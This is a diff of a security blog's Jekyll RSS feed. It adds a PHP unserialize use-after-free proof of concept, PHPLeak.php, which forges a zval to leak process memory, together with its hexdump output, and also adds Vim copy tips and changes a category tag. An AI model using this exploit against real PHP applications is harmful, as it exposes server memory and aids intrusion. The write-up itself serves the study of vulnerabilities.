@@ -5,8 +5,8 @@
     <description>A blog about programming and network security</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Fri, 12 May 2017 00:01:15 +0800</pubDate>
-    <lastBuildDate>Fri, 12 May 2017 00:01:15 +0800</lastBuildDate>
+    <pubDate>Fri, 12 May 2017 07:50:26 +0800</pubDate>
+    <lastBuildDate>Fri, 12 May 2017 07:50:26 +0800</lastBuildDate>
     <generator>Jekyll v3.4.2</generator>
     
       <item>
@@ -718,6 +718,27 @@ gdb
     AAA..AA(39xA)这个zval所在的内存的位置
     运行/usr/bin/ndphp/bin/php PHPLeak.php | hexdump -c
 
+    ---------PHPLeak.php------------
+    &amp;lt;?php
+    $fakezval = pack(
+        'IIII',     //unsigned int
+        0x08048000, //address to leak
+        0x0000000f, //length of string
+        0x00000000, //refcount
+        0x00000006  //data type NULL=0,LONG=1,DOUBLE=2,BOOL=3,ARR=4,OBJ=5,STR=6,RES=7
+    );
+    //obj from original POC by @ion1c
+    $obj = 'O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:4:&quot;AAAA&quot;;}';
+    $obj=unserialize($obj);
+
+    for($i = 0; $i &amp;lt; 5; $i++) { //this i value is larger than usually required
+        $v[$i]=$fakezval.$i; //repeat to overwrite
+    }
+    //due to the reference being overwritten by our loop above, leak memory
+    echo $obj-&amp;gt;ccc;
+    ?&amp;gt;
+    ---------PHPLeak.php------------
+
     output:
     $ /usr/bin/ndphp/bin/php PHPLeak.php | hexdump -c
     0000000 177   E   L   F 001 001 001  \0  \0  \0  \0  \0  \0  \0  \0
@@ -831,19 +852,25 @@ http://www.cnblogs.com/LittleHann/p/3522990.html
         <description>&lt;p&gt;###&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.免去.vimrc中写set pastetoggle=&amp;lt;f7&amp;gt;,(:set paste或:set unpaste)粘贴原文的时候直接用&quot;+寄存器
+2.复制内容时可这样:(这样可免去进入可视模式)
+    1&amp;gt;在要复制的起始处ma(标记为a)
+    2&amp;gt;s跳转到要复制的结尾处(已经将s设置为easymotion插件的触发键的情况下)
+    3&amp;gt;在已经跳转到的结尾处y'a(表示复制到a标记处)
+    4&amp;gt;s跳转到要粘贴的地方,然后p即可
+
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 </description>
         <pubDate>Wed, 22 Mar 2017 00:00:00 +0800</pubDate>
-        <link>http://3xp10it.cc/web/2017/03/22/vim%E6%8A%80%E5%B7%A7/</link>
-        <guid isPermaLink="true">http://localhost:4000/web/2017/03/22/vim%E6%8A%80%E5%B7%A7/</guid>
+        <link>http://3xp10it.cc/vim/2017/03/22/vim%E6%8A%80%E5%B7%A7/</link>
+        <guid isPermaLink="true">http://localhost:4000/vim/2017/03/22/vim%E6%8A%80%E5%B7%A7/</guid>
         
         <category>vim</category>
         
         <category>editor</category>
         
         
-        <category>web</category>
+        <category>vim</category>
         
       </item>
     
